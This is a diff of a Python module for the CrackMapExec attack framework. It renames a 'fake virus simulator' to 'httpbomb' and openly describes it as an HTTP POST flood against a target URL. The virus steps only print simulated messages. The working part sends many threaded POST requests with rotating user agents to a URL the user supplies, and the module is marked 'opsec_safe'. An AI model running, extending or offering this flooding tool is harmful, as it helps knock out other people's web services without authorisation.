@@ -1,12 +1,12 @@
-from concurrent.futures import ThreadPoolExecutor
 import random
 import string
 import time
 import requests
+from concurrent.futures import ThreadPoolExecutor
 
 class CMEModule:
-    name = 'fakesim'
-    description = 'Fake virus simulator + web POST sender'
+    name = 'httpbomb'
+    description = 'Send fake virus + HTTP POST flood to target URL'
     supported_protocols = ['smb']
     opsec_safe = True
     multiple_hosts = True
@@ -15,11 +15,12 @@ class CMEModule:
         self.context = context
         self.options = options
 
-        # Parse options from CME command line
+        # Required options
         self.target_url = self.options.get('URL')
-        self.requests_to_send = int(self.options.get('NUM', 20))
-        self.max_workers = int(self.options.get('THREADS', 5))
-        self.visible_logs = int(self.options.get('LOGS', 10))
+        self.total_requests = int(self.options.get('REQUESTS', 20))
+        self.max_workers = int(self.options.get('WORKERS', 5))
+
+        self.visible_logs = min(self.total_requests, 10)  # Show only first 10 logs
 
         self.user_agents = [
             "Mozilla/5.0 (Linux; Android 12)",
@@ -53,29 +54,33 @@ class CMEModule:
     def infect_file(self, file_path):
         print(f"[SIMULATION] Infecting file: {file_path}")
         payload = self.generate_payload()
-        print(f"[SIMULATION] Writing fake payload to {file_path} (NOT ACTUALLY WRITTEN)")
+        print(f"[SIMULATION] Fake payload (not written): {payload[:10]}...")
 
     def scan_and_infect(self):
-        fake_files = [f"file_{i}.txt" for i in range(5)]
+        fake_files = [f"file_{i}.txt" for i in range(3)]
         for f in fake_files:
             self.infect_file(f)
-            time.sleep(0.1)
+            time.sleep(0.2)
 
     def connect_to_command_center(self):
-        print("[SIMULATION] Connecting to attacker server... (no real connection)")
+        print("[SIMULATION] Connecting to fake server... (no real connection)")
 
     def run(self):
-        print("[SIMULATION] Fake Virus Simulation Started.")
+        if not self.target_url:
+            print("❌ You must specify a URL using: -o URL=http://target.com")
+            return
+
+        print("⚡ Fake Virus Simulation Started ⚡")
         self.connect_to_command_center()
         self.scan_and_infect()
-        print("[SIMULATION] Simulation finished.")
+        print("Simulation finished.\n")
 
-        print(f"\n🚀 Sending {self.requests_to_send} requests to {self.target_url} (only showing first {self.visible_logs})...")
+        print(f"🚀 Sending {self.total_requests} requests to {self.target_url} using {self.max_workers} threads...")
         start = time.time()
 
         with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
-            for i in range(self.requests_to_send):
+            for i in range(self.total_requests):
                 executor.submit(self.send_post, i)
 
         duration = round(time.time() - start, 2)
-        print(f"\n✅ Done sending {self.requests_to_send} requests in {duration} seconds.")
+        print(f"\n✅ Done sending {self.total_requests} requests in {duration} seconds.")
